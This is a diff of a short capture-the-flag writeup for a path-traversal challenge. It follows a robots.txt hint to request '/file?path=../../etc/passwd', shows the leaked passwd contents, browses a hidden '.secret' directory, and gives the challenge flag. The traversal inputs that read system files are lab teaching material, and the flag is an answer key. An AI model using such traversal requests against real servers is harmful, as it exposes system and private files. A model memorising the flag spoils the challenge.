@@ -1,21 +1,10 @@
-Writeup
+# Writeup
 First inspect or look at the source code
 
 <div class="hidden">
         <p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
 </div>
 so we get a hint to go to the robots.txt endpoint on going there u get
-
-User-agent: *
-
-# We value our digital privacy and have restricted access to certain system-level configurations.
-Disallow: /file?path=../../etc/passwd
-Disallow: /file?path=../../../etc/passwd
-
-# Hint for curious explorers: 
-# Sometimes system files like /etc/passwd can reveal interesting information...
-# But remember to respect privacy boundaries!
-so u go to the /file?path=../../etc/passwd endpoint and it says
 
 "root:x:0:0:root:/root:/bin/bash\n"
             "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
@@ -59,6 +48,7 @@ and then u go to /file?path=/home/ctf/.secret and u get
             "-r-------- 1 ctf ctf   48 Jan  1 10:00 flag.txt\n"
             "\n"
 and then u go to /home/ctf/.secret/flag.txt and u get the flag!
-Flag: citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}
+# Flag :
+ citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}
 
-Flag: citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}
+
